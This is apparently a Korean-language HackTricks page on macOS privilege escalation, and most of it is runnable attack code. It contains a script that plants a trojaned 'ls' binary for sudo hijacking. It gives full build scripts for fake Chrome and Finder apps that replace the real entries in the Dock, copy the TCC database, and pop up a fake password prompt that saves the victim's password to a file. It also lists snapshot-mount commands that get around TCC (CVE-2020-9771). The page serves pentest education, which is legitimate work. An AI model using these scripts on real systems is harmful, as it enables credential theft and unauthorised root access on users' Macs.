# macOS 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## TCC 권한 상승

TCC 권한 상승을 찾고 계신다면 다음으로 가세요:

{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux 권한 상승

**Linux/Unix에 영향을 미치는 권한 상승에 대한 대부분의 트릭은 MacOS에도 영향을 미칩니다**. 따라서 다음을 참조하세요:

{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## 사용자 상호작용

### Sudo 하이재킹

원래의 [Sudo 하이재킹 기법은 Linux 권한 상승 게시물에서 찾을 수 있습니다](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

그러나 macOS는 사용자가 **`sudo`**를 실행할 때 사용자의 **`PATH`**를 **유지**합니다. 즉, 이 공격을 달성하는 또 다른 방법은 피해자가 **sudo를 실행할 때** 여전히 실행할 **다른 바이너리**를 **하이재킹**하는 것입니다:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
사용자가 터미널을 사용하는 경우 **Homebrew가 설치되어 있을 가능성이 높습니다**. 따라서 **`/opt/homebrew/bin`**에서 바이너리를 탈취할 수 있습니다.

### Dock 사칭

일부 **소셜 엔지니어링**을 사용하여 Dock에서 **예를 들어 Google Chrome을 사칭**하고 실제로 자신의 스크립트를 실행할 수 있습니다:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
몇 가지 제안:

- Dock에서 Chrome이 있는지 확인하고, 그런 경우 **해당 항목을 제거**하고 **같은 위치에 가짜 Chrome 항목을 추가**하세요.&#x20;
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
몇 가지 제안:

- **Dock에서 Finder를 제거할 수 없으므로**, Dock에 추가할 경우 가짜 Finder를 실제 Finder 바로 옆에 두는 것이 좋습니다. 이를 위해 **Dock 배열의 시작 부분에 가짜 Finder 항목을 추가해야 합니다**.
- 또 다른 옵션은 Dock에 배치하지 않고 그냥 열어두는 것입니다. "Finder가 Finder를 제어하도록 요청하고 있습니다"는 그리 이상하지 않습니다.
- 비밀번호를 묻는 끔찍한 상자 없이 **루트로 상승**하는 또 다른 옵션은 Finder가 특권 작업을 수행하기 위해 실제로 비밀번호를 요청하도록 만드는 것입니다:
- Finder에게 **`/etc/pam.d`**에 새로운 **`sudo`** 파일을 복사하도록 요청합니다 (비밀번호를 묻는 프롬프트는 "Finder가 sudo를 복사하려고 합니다"라고 표시됩니다).
- Finder에게 새로운 **Authorization Plugin**을 복사하도록 요청합니다 (파일 이름을 제어할 수 있으므로 비밀번호를 묻는 프롬프트는 "Finder가 Finder.bundle을 복사하려고 합니다"라고 표시됩니다).
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

## TCC - 루트 권한 상승

### CVE-2020-9771 - mount_apfs TCC 우회 및 권한 상승

**모든 사용자** (특권이 없는 사용자 포함)는 타임 머신 스냅샷을 생성하고 마운트하여 **해당 스냅샷의 모든 파일에 접근**할 수 있습니다.\
필요한 **유일한 특권**은 사용되는 애플리케이션(예: `Terminal`)이 **전체 디스크 접근** (FDA) 권한(`kTCCServiceSystemPolicyAllfiles`)을 가져야 하며, 이는 관리자가 부여해야 합니다.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
보다 자세한 설명은 [**원본 보고서에서 확인할 수 있습니다**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## 민감한 정보

이는 권한 상승에 유용할 수 있습니다:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
